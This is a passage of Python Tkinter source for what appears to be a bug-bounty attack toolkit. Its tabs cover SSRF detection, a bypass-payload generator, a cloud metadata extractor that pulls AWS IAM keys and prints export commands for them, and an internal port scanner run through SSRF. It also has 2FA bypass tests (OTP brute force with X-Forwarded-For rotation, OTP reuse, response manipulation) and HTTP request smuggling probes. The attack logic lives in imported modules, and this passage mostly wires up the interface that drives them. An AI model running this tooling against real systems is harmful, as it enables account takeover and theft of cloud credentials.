            "System info":         '{ systemInfo { version dbVersion serverTime } }',
        }
        tk.Label(left, text="Quick Templates:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(4,2))
        for name, query in TEMPLATES.items():
            mk_btn(left, name, lambda q=query: (
                self._gql_query_txt.delete('1.0','end'),
                self._gql_query_txt.insert('end', q)
            ), FG3, small=True).pack(anchor='w', pady=1)

    def _gql_send_query(self):
        from modules.advanced import graphql_tester as _gql
        import json as _json
        ep    = self._gql_qb_ep.get().strip()
        query = self._gql_query_txt.get('1.0','end').strip()
        if not ep or not query: return
        try: variables = _json.loads(self._gql_vars_txt.get('1.0','end').strip() or '{}')
        except Exception: variables = {}
        self._gql_resp_txt.config(state='normal'); self._gql_resp_txt.delete('1.0','end')
        self._gql_resp_txt.insert('end', "[*] Sending query...\n"); self._gql_resp_txt.config(state='disabled')
        def _go():
            r = _gql.gql_request(ep, query, variables)
            def _upd():
                self._gql_resp_txt.config(state='normal')
                self._gql_resp_txt.delete('1.0','end')
                self._gql_resp_txt.insert('end', f"Status: {r.get('status','?')}\n\n")
                self._gql_resp_txt.insert('end', _json.dumps(r.get('data',{}), indent=2)[:5000])
                self._gql_resp_txt.config(state='disabled')
                self.set_status(f"GraphQL: {r.get('status','?')}", GREEN if r.get('ok') else RED)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()


    # ═════════════════════════════════════════════════════════════
    #  ☁️  SSRF SUITE TAB — v4
    # ═════════════════════════════════════════════════════════════
    def _build_ssrf_tab(self, frame):
        from modules.advanced import ssrf_suite as _ssrf
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔍 Quick Detector  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🛡 Bypass Generator  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  ☁️ Cloud Extractor  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  🔌 Port Scanner  ")

        def _mk_log(parent):
            txt = tk.Text(parent, height=16, bg='#020408', fg=GREEN,
                          font=('Consolas',9), relief='flat', bd=0,
                          state='disabled', wrap='none', padx=10, pady=6)
            vsb = ttk.Scrollbar(parent, orient='vertical', command=txt.yview)
            txt.configure(yscrollcommand=vsb.set)
            row = mk_frame(parent, bg=BG2); row.pack(fill='both', expand=True)
            txt.pack(side='left', fill='both', expand=True, in_=row)
            vsb.pack(side='right', fill='y', in_=row)
            def _log(m, t='info'):
                clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
                txt.config(state='normal')
                txt.insert('end', m+'\n', t)
                txt.tag_config(t, foreground=clr, font=('Consolas',9))
                txt.see('end'); txt.config(state='disabled')
            return _log

        # ── Tab 1: Quick Detector ─────────────────────────────────
        p1 = mk_frame(f1, bg=BG2); p1.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p1, "SSRF QUICK DETECTOR", "🔍").pack(fill='x', pady=(0,8))
        mk_card(p1).pack(fill='x', pady=(0,8))
        tk.Label(p1.winfo_children()[-1], text=(
            "  Tests if endpoint is vulnerable to SSRF — tries AWS/GCP/Azure/localhost\n"
            "  Use OAST Server tab for blind SSRF (DNS callbacks)\n"
            "  Confirmed SSRF auto-saved to Findings tab"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        r1 = mk_frame(p1, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ssrf_ep = tk.StringVar(value=f"https://{self.project.get()}/api/fetch" if self.project.get() else "")
        mk_entry(r1, var=self._ssrf_ep, w=48).pack(side='left', padx=8, ipady=3)

        r2 = mk_frame(p1, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="URL Param:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ssrf_param = tk.StringVar(value="url")
        mk_entry(r2, var=self._ssrf_param, w=12).pack(side='left', padx=8, ipady=3)
        tk.Label(r2, text="  OAST Host:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._ssrf_oast  = tk.StringVar(value="your-vps.com")
        mk_entry(r2, var=self._ssrf_oast, w=24).pack(side='left', ipady=3)

        log1 = _mk_log(p1)

        def _run_ssrf_quick():
            ep    = self._ssrf_ep.get().strip()
            param = self._ssrf_param.get().strip() or "url"
            if not ep:
                messagebox.showwarning("No Target", "Enter an endpoint URL first.", parent=self.root); return
            def _go():
                r = _ssrf.test_ssrf_quick(ep, param, self._ssrf_oast.get(), log1)
                def _done():
                    if r.get('vulnerable'):
                        log1(f"\n  🔴 SSRF CONFIRMED! {len(r['results'])} target(s) reachable", "ok")
                        proj = self.project.get() or ep.split('/')[2] if '/' in ep else "target"
                        save_finding({"title": f"SSRF on {ep}", "url": ep, "type": "SSRF",
                                      "severity": "HIGH", "cvss_score": "8.6",
                                      "description": f"SSRF via '{param}' parameter",
                                      "poc": f"{ep}?{param}=http://169.254.169.254/",
                                      "impact": "Internal service access, cloud metadata exposure",
                                      "project": proj, "tool": "SSRF Suite v4", "status": "Open"})
                        log1("  [✓] Finding auto-saved to Findings tab!", "ok")
                        self._refresh_findings()
                    self.set_status(f"SSRF: {'VULNERABLE' if r.get('vulnerable') else 'not detected'}", RED if r.get('vulnerable') else GREEN)
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()

        mk_btn(p1, "🔍 Run SSRF Detection", _run_ssrf_quick, GREEN).pack(anchor='w', pady=(8,0), ipady=5)

        # ── Tab 2: Bypass Generator ───────────────────────────────
        p2 = mk_frame(f2, bg=BG2); p2.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p2, "SSRF BYPASS GENERATOR — 36+ Techniques", "🛡").pack(fill='x', pady=(0,8))

        r3 = mk_frame(p2, bg=BG2); r3.pack(fill='x', pady=(0,8))
        tk.Label(r3, text="Blocked IP:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ssrf_blocked = tk.StringVar(value="169.254.169.254")
        ttk.Combobox(r3, textvariable=self._ssrf_blocked, width=22, font=MONO_S,
                     values=["169.254.169.254","127.0.0.1","192.168.1.1","10.0.0.1","172.16.0.1"]).pack(side='left', padx=8)

        bypass_txt = tk.Text(p2, height=22, bg='#020408', fg=CYAN,
                              font=('Consolas',9), relief='flat', bd=0,
                              state='disabled', wrap='none', padx=10, pady=6)
        vsb2 = ttk.Scrollbar(p2, orient='vertical', command=bypass_txt.yview)
        bypass_txt.configure(yscrollcommand=vsb2.set)
        tf2 = mk_frame(p2, bg=BG2); tf2.pack(fill='both', expand=True)
        bypass_txt.pack(side='left', fill='both', expand=True, in_=tf2)
        vsb2.pack(side='right', fill='y', in_=tf2)

        def _gen_bypasses():
            ip = self._ssrf_blocked.get().strip()
            if not ip: return
            payloads = _ssrf.generate_ssrf_bypasses(ip)
            bypass_txt.config(state='normal'); bypass_txt.delete('1.0','end')
            bypass_txt.insert('end', f"# SSRF Bypass Payloads for: {ip}\n# Total: {len(payloads)}\n\n")
            for i, p in enumerate(payloads, 1):
                bypass_txt.insert('end', f"  [{i:3d}]  {p}\n")
            bypass_txt.config(state='disabled')
            self.set_status(f"Generated {len(payloads)} SSRF bypass payloads", GREEN)

        bf2 = mk_frame(p2, bg=BG2); bf2.pack(fill='x', pady=(8,0))
        mk_btn(bf2, "⚡ Generate Bypasses", _gen_bypasses, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf2, "📋 Copy All", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(bypass_txt.get('1.0','end')),
            self.root.update()), FG2, small=True).pack(side='left', padx=4)

        # ── Tab 3: Cloud Extractor ────────────────────────────────
        p3 = mk_frame(f3, bg=BG2); p3.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p3, "CLOUD METADATA EXTRACTOR — AWS / GCP / Azure", "☁️").pack(fill='x', pady=(0,8))
        crd = mk_card(p3); crd.pack(fill='x', pady=(0,8))
        tk.Label(crd, text=(
            "  SSRF → AWS IMDSv1 → IAM credentials → Full account takeover  (CRITICAL $50k+)\n"
            "  AccessKeyId + SecretAccessKey + Token extracted automatically\n"
            "  GCP: OAuth token  ·  Azure: Managed Identity token"
        ), bg=BG3, fg=RED, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        r4 = mk_frame(p3, bg=BG2); r4.pack(fill='x', pady=(0,6))
        tk.Label(r4, text="SSRF Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cloud_ep = tk.StringVar()
        mk_entry(r4, var=self._cloud_ep, w=46).pack(side='left', padx=8, ipady=3)

        r5 = mk_frame(p3, bg=BG2); r5.pack(fill='x', pady=(0,6))
        tk.Label(r5, text="Cloud:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cloud_type = tk.StringVar(value="AWS")
        for c2, clr in [("AWS",YELLOW),("GCP",GREEN),("Azure",CYAN),("Auto",ACCENT)]:
            ttk.Radiobutton(r5, text=c2, variable=self._cloud_type, value=c2).pack(side='left', padx=8)
        tk.Label(r5, text="  IAM Role:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._cloud_role = tk.StringVar(value="")
        mk_entry(r5, var=self._cloud_role, w=22).pack(side='left', ipady=3)

        log3 = _mk_log(p3)

        def _run_cloud():
            ep    = self._cloud_ep.get().strip()
            cloud = self._cloud_type.get()
            if not ep: return
            def _go():
                clouds = [cloud] if cloud != "Auto" else ["AWS","GCP","Azure"]
                for c2 in clouds:
                    if c2 == "AWS":
                        r = _ssrf.fetch_aws_metadata(ep, self._cloud_role.get().strip() or None, log3)
                        creds = r.get('credentials',{})
                        if creds.get('AccessKeyId'):
                            def _crit(c=creds, e=ep):
                                log3(f"\n  🔴 AWS KEYS EXTRACTED!", "ok")
                                log3(f"  AccessKeyId:     {c['AccessKeyId']}", "ok")
                                log3(f"  SecretAccessKey: {c['SecretAccessKey'][:6]}...", "ok")
                                log3(f"  Role:            {c.get('Role','')}", "ok")
                                log3(f"\n  Commands:", "warn")
                                log3(f"  export AWS_ACCESS_KEY_ID={c['AccessKeyId']}", "dim")
                                log3(f"  export AWS_SECRET_ACCESS_KEY={c['SecretAccessKey']}", "dim")
                                log3(f"  aws sts get-caller-identity", "dim")
                                save_finding({"title":"AWS IAM Credentials via SSRF","url":e,
                                              "type":"SSRF→Cloud RCE","severity":"CRITICAL",
                                              "cvss_score":"10.0","project":self.project.get() or "target",
                                              "description":"AWS IAM credentials extracted via SSRF+IMDSv1",
                                              "impact":"Full AWS account takeover",
                                              "tool":"SSRF Suite v4","status":"Open"})
                                self._refresh_findings()
                                log3("  [✓] CRITICAL finding saved!", "ok")
                            self.root.after(0, _crit)
                    elif c2 == "GCP":
                        _ssrf.fetch_gcp_metadata(ep, log3)
                    elif c2 == "Azure":
                        _ssrf.fetch_azure_metadata(ep, log3)
            threading.Thread(target=_go, daemon=True).start()

        mk_btn(p3, "☁️ Extract Cloud Credentials", _run_cloud, RED).pack(anchor='w', pady=(8,0), ipady=5)

        # ── Tab 4: Port Scanner ───────────────────────────────────
        p4 = mk_frame(f4, bg=BG2); p4.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p4, "INTERNAL PORT SCANNER VIA SSRF", "🔌").pack(fill='x', pady=(0,8))

        r6 = mk_frame(p4, bg=BG2); r6.pack(fill='x', pady=(0,6))
        tk.Label(r6, text="SSRF Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._portscan_ep   = tk.StringVar()
        mk_entry(r6, var=self._portscan_ep, w=42).pack(side='left', padx=8, ipady=3)

        r7 = mk_frame(p4, bg=BG2); r7.pack(fill='x', pady=(0,6))
        tk.Label(r7, text="Internal Host:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._portscan_host = tk.StringVar(value="127.0.0.1")
        ttk.Combobox(r7, textvariable=self._portscan_host, width=18, font=MONO_S,
                     values=["127.0.0.1","localhost","10.0.0.1","192.168.1.1","172.16.0.1"]).pack(side='left', padx=8)

        log4 = _mk_log(p4)

        def _run_portscan():
            ep   = self._portscan_ep.get().strip()
            host = self._portscan_host.get().strip() or "127.0.0.1"
            if not ep: return
            def _go():
                r = _ssrf.internal_port_scan(ep, host, log_cb=log3)
                self.root.after(0, lambda: self.set_status(f"Port scan: {r.get('summary','')}", GREEN))
            threading.Thread(target=_go, daemon=True).start()

        mk_btn(p4, "🔌 Scan Internal Ports via SSRF", _run_portscan, RED).pack(anchor='w', pady=(8,0), ipady=5)

    # ═════════════════════════════════════════════════════════════
    #  🔑  2FA BYPASS TAB — v4
    # ═════════════════════════════════════════════════════════════
    def _build_mfa_tab(self, frame):
        from modules.advanced import mfa_bypass as _mfa
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔍 Auto Scan  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  📡 OTP Leakage  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  ⚡ Rate Limit  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  🔄 OTP Reuse  ")
        f5 = tk.Frame(nb2, bg=BG2); nb2.add(f5, text="  🎭 Resp Manip  ")

        def _mklog(parent):
            txt = tk.Text(parent, height=14, bg='#020408', fg=GREEN,
                          font=('Consolas',9), relief='flat', bd=0,
                          state='disabled', wrap='none', padx=10, pady=6)
            vsb = ttk.Scrollbar(parent, orient='vertical', command=txt.yview)
            txt.configure(yscrollcommand=vsb.set)
            row = mk_frame(parent, bg=BG2); row.pack(fill='both', expand=True)
            txt.pack(side='left', fill='both', expand=True, in_=row)
            vsb.pack(side='right', fill='y', in_=row)
            def fn(m, t='info'):
                clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
                txt.config(state='normal')
                txt.insert('end', m+'\n', t)
                txt.tag_config(t, foreground=clr, font=('Consolas',9))
                txt.see('end'); txt.config(state='disabled')
            return fn

        # Shared config fields — created once, shared across sub-tabs
        self._mfa_login_url  = tk.StringVar(value=f"https://{self.project.get()}/login" if self.project.get() else "")
        self._mfa_verify_url = tk.StringVar(value=f"https://{self.project.get()}/verify-otp" if self.project.get() else "")
        self._mfa_username   = tk.StringVar(value="")
        self._mfa_password   = tk.StringVar(value="")
        self._mfa_cookie     = tk.StringVar(value="")

        # ── Sub-tab 1: Auto Scan ───────────────────────────────────
        p1 = mk_frame(f1, bg=BG2); p1.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p1, "2FA / MFA BYPASS AUTO SCANNER", "🔍").pack(fill='x', pady=(0,8))
        crd = mk_card(p1); crd.pack(fill='x', pady=(0,8))
        tk.Label(crd, text=(
            "  Runs ALL bypass techniques automatically\n"
            "  OTP leakage · Rate limit check · Response manipulation\n"
            "  Any finding = CRITICAL — auto-saved to Findings tab"
        ), bg=BG3, fg=RED, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        for lbl, attr, show in [
            ("Login URL:",   "_mfa_login_url",  ""),
            ("Verify URL:",  "_mfa_verify_url", ""),
            ("Username:",    "_mfa_username",   ""),
            ("Password:",    "_mfa_password",   "●"),
            ("Session Cookie:", "_mfa_cookie",  ""),
        ]:
            r = mk_frame(p1, bg=BG2); r.pack(fill='x', pady=3)
            tk.Label(r, text=lbl, bg=BG2, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left', padx=(0,8))
            v = getattr(self, attr)
            kw = {"show": show} if show else {}
            mk_entry(r, var=v, w=50, **kw).pack(side='left', ipady=3, fill='x', expand=True)

        log1 = _mklog(p1)

        def _run_full_audit():
            cfg = {"login_url":  self._mfa_login_url.get(),
                   "verify_url": self._mfa_verify_url.get(),
                   "username":   self._mfa_username.get(),
                   "password":   self._mfa_password.get()}
            if not cfg["verify_url"]:
                messagebox.showwarning("No Target", "Enter the 2FA Verify URL first.\nExample: https://example.com/api/verify-otp", parent=self.root); return
            def _go():
                r = _mfa.run_full_audit(cfg, log1)
                vuln = r.get("vulnerable_count", 0)
                def _done():
                    if vuln:
                        log1(f"\n  🔴 {vuln} BYPASS(ES) CONFIRMED!", "ok")
                        save_finding({"title": f"2FA Bypass on {cfg['verify_url']}",
                                      "url": cfg['verify_url'], "type": "Auth Bypass",
                                      "severity": "CRITICAL", "cvss_score": "9.8",
                                      "description": f"{vuln} 2FA bypass technique(s) confirmed",
                                      "project": self.project.get() or "target",
                                      "tool": "2FA Suite v4", "status": "Open"})
                        self._refresh_findings()
                        log1("  [✓] CRITICAL finding saved!", "ok")
                    self.set_status(f"2FA Audit: {vuln} bypass(es) found", RED if vuln else GREEN)
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()

        mk_btn(p1, "🔍 Run Full 2FA Audit", _run_full_audit, RED).pack(anchor='w', pady=(8,0), ipady=5)

        # ── Sub-tab 2: OTP Leakage ────────────────────────────────
        p2 = mk_frame(f2, bg=BG2); p2.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p2, "OTP LEAKAGE IN RESPONSE", "📡").pack(fill='x', pady=(0,8))
        crd2 = mk_card(p2); crd2.pack(fill='x', pady=(0,8))
        tk.Label(crd2, text=(
            '  App sends OTP via SMS/email AND leaks it in response: {"otp":"123456"}\n'
            "  Checks: JSON body · Hidden fields · X-OTP/X-Code headers\n"
            "  If found: login without SMS/TOTP app = instant account takeover"
        ), bg=BG3, fg=RED, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)
        log2 = _mklog(p2)
        def _run_otp_leak():
            def _go():
                r = _mfa.test_otp_in_response(
                    self._mfa_login_url.get(), self._mfa_username.get(),
                    self._mfa_password.get(), log2)
                if r.get("vulnerable"):
                    self.root.after(0, lambda: (
                        self.set_status("OTP LEAKAGE CONFIRMED! Check results.", RED),
                        save_finding({"title": "OTP Leaked in Login Response",
                                      "url": self._mfa_login_url.get(),
                                      "type": "Auth Bypass", "severity": "CRITICAL",
                                      "cvss_score": "9.8",
                                      "description": "OTP code found in HTTP response body/headers",
                                      "project": self.project.get() or "target",
                                      "tool": "2FA Suite v4", "status": "Open"}),
                        self._refresh_findings()
                    ))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(p2, "📡 Test OTP Leakage", _run_otp_leak, RED, small=True).pack(anchor='w', pady=(8,0))

        # ── Sub-tab 3: Rate Limit ─────────────────────────────────
        p3 = mk_frame(f3, bg=BG2); p3.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p3, "RATE LIMIT TESTER — OTP Brute Force Check", "⚡").pack(fill='x', pady=(0,8))
        crd3 = mk_card(p3); crd3.pack(fill='x', pady=(0,8))
        tk.Label(crd3, text=(
            "  6-digit OTP = 1,000,000 combos. Without rate limit = bruteforceable\n"
            "  Tests: sends N wrong OTPs, checks if HTTP 429 / lockout triggers\n"
            "  X-Forwarded-For rotation: bypass IP-based limiting"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)
        r3 = mk_frame(p3, bg=BG2); r3.pack(fill='x', pady=(0,6))
        tk.Label(r3, text="Max attempts:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._mfa_attempts = tk.StringVar(value="15")
        ttk.Combobox(r3, textvariable=self._mfa_attempts, width=5, font=MONO_S,
                     values=["5","10","15","20","50"]).pack(side='left', padx=8)
        log3 = _mklog(p3)
        def _run_rl():
            try: n = int(self._mfa_attempts.get())
            except: n = 15
            def _go():
                r = _mfa.test_rate_limit(self._mfa_verify_url.get(), n, log3)
                if r.get("vulnerable"):
                    self.root.after(0, lambda: (
                        self.set_status("No rate limit! OTP brute-force possible!", RED),
                        save_finding({"title": f"No 2FA Rate Limit",
                                      "url": self._mfa_verify_url.get(),
                                      "type": "Auth Bypass", "severity": "HIGH",
                                      "cvss_score": "7.5",
                                      "description": f"No lockout after {n} OTP attempts",
                                      "project": self.project.get() or "target",
                                      "tool": "2FA Suite v4", "status": "Open"}),
                        self._refresh_findings()
                    ))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(p3, "⚡ Test Rate Limiting", _run_rl, YELLOW, small=True).pack(anchor='w', pady=(8,0))

        # ── Sub-tab 4: OTP Reuse ──────────────────────────────────
        p4 = mk_frame(f4, bg=BG2); p4.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p4, "OTP REUSE TESTER", "🔄").pack(fill='x', pady=(0,8))
        crd4 = mk_card(p4); crd4.pack(fill='x', pady=(0,8))
        tk.Label(crd4, text=(
            "  Submit same valid OTP twice — if 2nd attempt succeeds = OTP not invalidated\n"
            "  Scenario: OTP sent to email → forwarded to attacker → reused after victim logs in"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)
        r4 = mk_frame(p4, bg=BG2); r4.pack(fill='x', pady=(0,6))
        tk.Label(r4, text="Valid OTP:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._mfa_valid_otp = tk.StringVar(value="")
        mk_entry(r4, var=self._mfa_valid_otp, w=10).pack(side='left', padx=8, ipady=3)
        log4 = _mklog(p4)
        def _run_reuse():
            otp = self._mfa_valid_otp.get().strip()
            if not otp: messagebox.showwarning("OTP Required","Enter a valid OTP first", parent=self.root); return
            def _go():
                r = _mfa.test_otp_reuse(self._mfa_verify_url.get(), otp, self._mfa_cookie.get(), log4)
                if r.get("vulnerable"):
                    self.root.after(0, lambda: self.set_status("OTP REUSE CONFIRMED!", RED))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(p4, "🔄 Test OTP Reuse", _run_reuse, RED, small=True).pack(anchor='w', pady=(8,0))

        # ── Sub-tab 5: Response Manipulation ─────────────────────
        p5 = mk_frame(f5, bg=BG2); p5.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p5, "RESPONSE MANIPULATION GUIDE", "🎭").pack(fill='x', pady=(0,8))
        crd5 = mk_card(p5); crd5.pack(fill='x', pady=(0,8))
        tk.Label(crd5, text=(
            '  Flip "success": false → true in response  OR  change HTTP 403 → 200\n'
            "  Works when app trusts client response instead of server session state\n"
            "  Tool: Use HTTP Replayer tab to intercept + modify response on the fly"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)
        log5 = _mklog(p5)
        def _run_rm():
            def _go():
                r = _mfa.test_response_manipulation(self._mfa_verify_url.get(), log_cb=log5)
                tests = r.get("tests", [])
                def _done():
                    if tests:
                        log5(f"\n  Found {len(tests)} field(s) to manipulate:", "warn")
                        for t in tests:
                            log5(f"  → {t.get('instruction','')}", "warn")
                    self.set_status(f"Response manipulation: {len(tests)} fields found", YELLOW if tests else GREEN)
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(p5, "🎭 Analyze 2FA Response Fields", _run_rm, YELLOW, small=True).pack(anchor='w', pady=(8,0))

    # ═════════════════════════════════════════════════════════════
    #  🔀  HTTP SMUGGLING TAB — v4
    # ═════════════════════════════════════════════════════════════
    def _build_smuggling_tab(self, frame):
        from modules.advanced import http_smuggling as _smug
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔍 Auto Detector  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🔧 TE.TE Variants  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  💣 Exploit Builder  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  📖 Theory  ")

        def _tlog(txt, m, t='info'):
            clr = {'ok':GREEN,'warn':YELLOW,'err':RED,'info':CYAN,'dim':FG3}.get(t,FG)
            txt.config(state='normal')
            txt.insert('end', m+'\n', t)
            txt.tag_config(t, foreground=clr, font=('Consolas',9))
            txt.see('end'); txt.config(state='disabled')

        def _mklog2(parent):
            txt = tk.Text(parent, height=18, bg='#020408', fg=GREEN,
                          font=('Consolas',9), relief='flat', bd=0,
                          state='disabled', wrap='none', padx=10, pady=6)
            vsb = ttk.Scrollbar(parent, orient='vertical', command=txt.yview)
            txt.configure(yscrollcommand=vsb.set)
            row = mk_frame(parent, bg=BG2); row.pack(fill='both', expand=True)
            txt.pack(side='left', fill='both', expand=True, in_=row)
            vsb.pack(side='right', fill='y', in_=row)
            return txt, lambda m, t='info': _tlog(txt, m, t)

        # Shared target fields
        self._smug_host = tk.StringVar(value=self.project.get() or "")
        self._smug_port = tk.StringVar(value="443")
        self._smug_path = tk.StringVar(value="/")
        self._smug_tls  = tk.BooleanVar(value=True)

        # ── Sub-tab 1: Auto Detector ──────────────────────────────
        p1 = mk_frame(f1, bg=BG2); p1.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p1, "HTTP REQUEST SMUGGLING — TIMING DETECTOR", "🔍").pack(fill='x', pady=(0,8))
        crd = mk_card(p1); crd.pack(fill='x', pady=(0,8))
        tk.Label(crd, text=(
            "  Raw socket timing attack — detects CL.TE, TE.CL, TE.TE\n"
            "  Probe takes 5+ seconds = back-end is waiting = VULNERABLE\n"
            "  Consistently HIGH/CRITICAL bounties — WAF bypass + session hijack"
        ), bg=BG3, fg=RED, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        for lbl, attr, w, vals in [
            ("Host:",  "_smug_host", 34, None),
            ("Port:",  "_smug_port", 6,  ["443","80","8080","8443"]),
            ("Path:",  "_smug_path", 26, None),
        ]:
            r = mk_frame(p1, bg=BG2); r.pack(fill='x', pady=3)
            tk.Label(r, text=lbl, bg=BG2, fg=FG3, font=MONO_S, width=8, anchor='e').pack(side='left', padx=(0,8))
            v = getattr(self, attr)
            if vals:
                ttk.Combobox(r, textvariable=v, values=vals, width=w, font=MONO_S).pack(side='left')
            else:
                mk_entry(r, var=v, w=w).pack(side='left', ipady=3)

        tr = mk_frame(p1, bg=BG2); tr.pack(fill='x', pady=(0,6))
        ttk.Checkbutton(tr, text="TLS/HTTPS", variable=self._smug_tls).pack(side='left')

        smug_txt1, smug_log1 = _mklog2(p1)

        def _run_auto():
            host = self._smug_host.get().strip()
            if not host: return
            try: port = int(self._smug_port.get())
            except: port = 443
            smug_txt1.config(state='normal'); smug_txt1.delete('1.0','end')
            smug_txt1.config(state='disabled')
            def _go():
                r = _smug.full_smuggling_scan(host, port, self._smug_path.get() or "/", smug_log1)
                def _done():
                    vulns = [f for f in r.get('findings',[]) if f.get('vulnerable')]
                    if vulns:
                        smug_log1(f"\n  🔴 HTTP SMUGGLING CONFIRMED! Type: {vulns[0].get('type')}", "ok")
                        save_finding({"title": f"HTTP Request Smuggling — {host}",
                                      "url": f"https://{host}{self._smug_path.get() or '/'}",
                                      "type": "HTTP Request Smuggling",
                                      "severity": "CRITICAL", "cvss_score": "9.8",
                                      "description": f"HTTP desync: {vulns[0].get('type')} confirmed via timing",
                                      "poc": f"CL.TE or TE.CL desync on {host}:{port}",
                                      "impact": "WAF bypass, session hijacking, cache poisoning",
                                      "project": self.project.get() or host,
                                      "tool": "HTTP Smuggling v4", "status": "Open"})
                        self._refresh_findings()
                        smug_log1("  [✓] CRITICAL finding saved!", "ok")
                    self.set_status(f"Smuggling: {'VULNERABLE' if r.get('vulnerable') else 'not detected'}", RED if r.get('vulnerable') else GREEN)
                self.root.after(0, _done)
            threading.Thread(target=_go, daemon=True).start()

        def _run_smuggler_py():
            """Run the built-in smuggler.py tool."""
            host = self._smug_host.get().strip()
            if not host:
                messagebox.showwarning("No Target", "Enter a target host first.\nExample: example.com", parent=self.root); return
            use_tls = self._smug_tls.get()
            url = f"{'https' if use_tls else 'http'}://{host}{self._smug_path.get() or '/'}"
            smug_txt1.config(state='normal'); smug_txt1.delete('1.0','end')
            smug_txt1.config(state='disabled')
            def _go():
                import importlib.util, sys as _sys
                smuggler_path = BASE_DIR / "tools" / "smuggler.py"
                if not smuggler_path.exists():
                    smug_log1(f"[-] tools/smuggler.py not found", "err"); return
                try:
                    spec = importlib.util.spec_from_file_location("smuggler", smuggler_path)
                    mod  = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    result = mod.scan(url, log_fn=smug_log1)
                    if result.get('vulnerable'):
                        def _save():
                            save_finding({
                                "title": f"HTTP Smuggling (smuggler.py) — {host}",
                                "url": url, "type": "HTTP Request Smuggling",
                                "severity": "CRITICAL", "cvss_score": "9.8",
                                "description": f"Confirmed by smuggler.py: {[r['test'] for r in result['results'] if r.get('vulnerable')]}",
                                "project": self.project.get() or host,
                                "tool": "smuggler.py", "status": "Open"
                            })
                            self._refresh_findings()
                            smug_log1("[✓] CRITICAL finding saved!", "ok")
                        self.root.after(0, _save)
                except Exception as e:
                    smug_log1(f"[-] Error: {e}", "err")
            threading.Thread(target=_go, daemon=True).start()

        bf_smug = mk_frame(p1, bg=BG2); bf_smug.pack(fill='x', pady=(8,0))
        mk_btn(bf_smug, "🔍 Auto-Detect (Built-in)",  _run_auto,        RED).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf_smug, "🐍 Run smuggler.py",          _run_smuggler_py, PURPLE).pack(side='left', ipady=5, padx=(0,4))
        mk_btn(bf_smug, "📋 Copy Output", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(smug_txt1.get('1.0','end')),
            self.root.update()), FG2, small=True).pack(side='left', padx=4)

        # ── Sub-tab 2: TE.TE Variants ─────────────────────────────
